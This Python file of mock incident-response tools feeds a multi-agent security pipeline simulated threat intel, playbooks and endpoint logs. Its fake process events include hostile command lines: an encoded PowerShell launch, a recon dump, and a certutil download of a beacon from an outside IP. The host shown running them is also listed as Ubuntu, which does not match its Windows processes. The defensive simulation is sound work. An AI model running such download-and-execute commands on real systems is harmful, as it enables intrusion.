"""Mock security tools for the Cyber Guardian incident response agent.

These tools return realistic simulated data so the multi-agent pipeline
can run without external dependencies (no BigQuery, no SIEM, no SOAR).
In production, these would query real security infrastructure.

Based on google/adk-samples/cyber-guardian-agent (Apache 2.0).
Original uses BigQuery; this version uses mock data for training.
"""

import json
import logging

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Mock data simulating a realistic security incident
# ---------------------------------------------------------------------------

MOCK_ASSETS = {
    "srv-web-prod-01": {
        "Owner": "platform-team",
        "BusinessCriticality": "Critical",
        "OS": "Ubuntu 22.04",
        "AssetType": "Web Server",
    },
    "ws-dev-042": {
        "Owner": "dev-team",
        "BusinessCriticality": "Medium",
        "OS": "Windows 11",
        "AssetType": "Workstation",
    },
    "db-payments-01": {
        "Owner": "finops-team",
        "BusinessCriticality": "Critical",
        "OS": "RHEL 9",
        "AssetType": "Database Server",
    },
}

MOCK_THREAT_INTEL = {
    "185.220.101.42": {
        "IsMalicious": True,
        "ThreatName": "Cobalt Strike C2",
        "Confidence": "High",
        "IOC_Type": "IP",
    },
    "d8e8fca2dc0f896fd7cb4cb0031ba249": {
        "IsMalicious": True,
        "ThreatName": "Mimikatz Credential Dumper",
        "Confidence": "Critical",
        "IOC_Type": "MD5",
    },
    "update-service.example.com": {
        "IsMalicious": True,
        "ThreatName": "DarkGate Loader C2",
        "Confidence": "Medium",
        "IOC_Type": "Domain",
    },
    "94.131.98.14": {
        "IsMalicious": False,
        "ThreatName": "Unknown",
        "Confidence": "Unknown",
        "IOC_Type": "IP",
    },
}

MOCK_PROCESS_EVENTS = [
    {
        "EventTimestamp": "2026-04-08T14:23:01Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "powershell.exe",
        "ParentProcessName": "w3wp.exe",
        "CommandLine": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
        "Username": "SYSTEM",
    },
    {
        "EventTimestamp": "2026-04-08T14:23:05Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "cmd.exe",
        "ParentProcessName": "powershell.exe",
        "CommandLine": "cmd /c whoami /all > C:\\Windows\\Temp\\recon.txt",
        "Username": "SYSTEM",
    },
    {
        "EventTimestamp": "2026-04-08T14:23:12Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "certutil.exe",
        "ParentProcessName": "cmd.exe",
        "CommandLine": "certutil -urlcache -f http://185.220.101.42/beacon.exe C:\\Windows\\Temp\\svc.exe",
        "Username": "SYSTEM",
    },
]

MOCK_NETWORK_CONNECTIONS = [
    {
        "log_timestamp": "2026-04-08T14:23:15Z",
        "source_host": "srv-web-prod-01",
        "source_ip": "10.0.1.15",
        "destination_ip": "185.220.101.42",
        "destination_port": 443,
        "protocol": "TCP",
    },
    {
        "log_timestamp": "2026-04-08T14:25:30Z",
        "source_host": "srv-web-prod-01",
        "source_ip": "10.0.1.15",
        "destination_ip": "185.220.101.42",
        "destination_port": 8443,
        "protocol": "TCP",
    },
]

MOCK_PLAYBOOKS = {
    "Cobalt Strike C2": [
        {"ActionCommand": "block-ip", "Target": "185.220.101.42 at perimeter firewall", "RequiresApproval": False},
        {"ActionCommand": "isolate-host", "Target": "srv-web-prod-01", "RequiresApproval": True},
        {"ActionCommand": "reset-credentials", "Target": "SYSTEM account on srv-web-prod-01", "RequiresApproval": True},
        {"ActionCommand": "collect-forensics", "Target": "Memory dump from srv-web-prod-01", "RequiresApproval": False},
    ],
    "DarkGate Loader C2": [
        {"ActionCommand": "block-domain", "Target": "update-service.example.com", "RequiresApproval": False},
        {"ActionCommand": "quarantine-endpoint", "Target": "affected workstation", "RequiresApproval": True},
    ],
}

MOCK_INCIDENTS = []


# ---------------------------------------------------------------------------
# Tool functions (called by sub-agents via FunctionTool)
# ---------------------------------------------------------------------------

def triageQueryTool(hostname: str, alert_type: str) -> str:
    """Check for duplicate incidents and enrich a host with business context.

    Args:
        hostname: The hostname from the alert (e.g., 'srv-web-prod-01').
        alert_type: The type of the alert (e.g., 'IOC_MATCH', 'EDR_DETECTION').
    """
    # Deduplication check
    for incident in MOCK_INCIDENTS:
        if incident["hostname"] == hostname and incident["alert_type"] == alert_type:
            return json.dumps({
                "is_duplicate": True,
                "existing_incident": incident["incident_id"],
            })

    # Asset enrichment
    asset = MOCK_ASSETS.get(hostname)
    if asset:
        return json.dumps({"is_duplicate": False, "asset_context": asset})

    return json.dumps({
        "is_duplicate": False,
        "asset_context": {"Owner": "Unknown", "BusinessCriticality": "Unknown"},
    })


def investigationQueryTool(
    alert_type: str,
    hostname: str,
    parent_process: str = None,
    destination_ip: str = None,
) -> str:
    """Investigate an alert by querying endpoint and network logs.

    Args:
        alert_type: The type of alert ('EDR_DETECTION', 'IOC_MATCH').
        hostname: The hostname to investigate.
        parent_process: (Optional) The parent process for EDR alerts.
        destination_ip: (Optional) The malicious IP for IOC_MATCH alerts.
    """
    if alert_type == "EDR_DETECTION":
        events = [e for e in MOCK_PROCESS_EVENTS if e["Hostname"] == hostname]
        if parent_process:
            events = [e for e in events if e["ParentProcessName"] == parent_process]
        return json.dumps(events) if events else json.dumps([])

    if alert_type == "IOC_MATCH" and destination_ip:
        connections = [
            c for c in MOCK_NETWORK_CONNECTIONS
            if c["source_host"] == hostname and c["destination_ip"] == destination_ip
        ]
        return json.dumps(connections) if connections else json.dumps([])

    return json.dumps({"error": "No matching investigation type. Provide more specific parameters."})


def threatIntelQueryTool(indicators: list[str]) -> str:
    """Enrich indicators of compromise using the threat intelligence knowledge base.

    Args:
        indicators: List of IOC values (IPs, hashes, domains) to look up.
    """
    results = []
    for ioc in indicators:
        intel = MOCK_THREAT_INTEL.get(ioc)
        if intel:
            results.append({"IOC_Value": ioc, **intel})
        else:
            results.append({
                "IOC_Value": ioc,
                "IsMalicious": False,
                "ThreatName": "Unknown",
                "Confidence": "Unknown",
            })
    return json.dumps(results)


def getPlaybookTool(triggering_condition: str) -> str:
    """Retrieve the appropriate response playbook based on a threat name.

    Args:
        triggering_condition: The threat name or condition (e.g., "Cobalt Strike C2").
    """
    # Try exact match first, then substring match
    playbook = MOCK_PLAYBOOKS.get(triggering_condition)
    if not playbook:
        for key, value in MOCK_PLAYBOOKS.items():
            if key.lower() in triggering_condition.lower():
                playbook = value
                break

    if playbook:
        return json.dumps(playbook)
    return json.dumps({"error": f"No playbook found for: {triggering_condition}"})


def responseExecutionTool(action: str, target: str) -> str:
    """Simulate executing a response action (IP block, host isolation, etc.).

    Args:
        action: The action command (e.g., 'block-ip', 'isolate-host').
        target: The target of the action (e.g., an IP address or hostname).
    """
    logger.info(f"[SIMULATED] Executing '{action}' on target '{target}'")
    return json.dumps({"status": "success", "action": action, "target": target, "note": "simulated"})


def createIncidentTool(alert_type: str, hostname: str, user: str, severity: str) -> str:
    """Create a new incident record.

    Args:
        alert_type: The type of the alert (e.g., 'EDR_DETECTION').
        hostname: The primary host involved.
        user: The primary user involved.
        severity: The severity of the alert (e.g., 'Critical', 'High').
    """
    import uuid
    incident_id = f"INC-{str(uuid.uuid4())[:8]}"
    incident = {
        "incident_id": incident_id,
        "alert_type": alert_type,
        "hostname": hostname,
        "user": user,
        "severity": severity,
        "status": "Triage",
    }
    MOCK_INCIDENTS.append(incident)
    logger.info(f"[SIMULATED] Created incident {incident_id}")
    return json.dumps({"status": "success", "incident_id": incident_id})
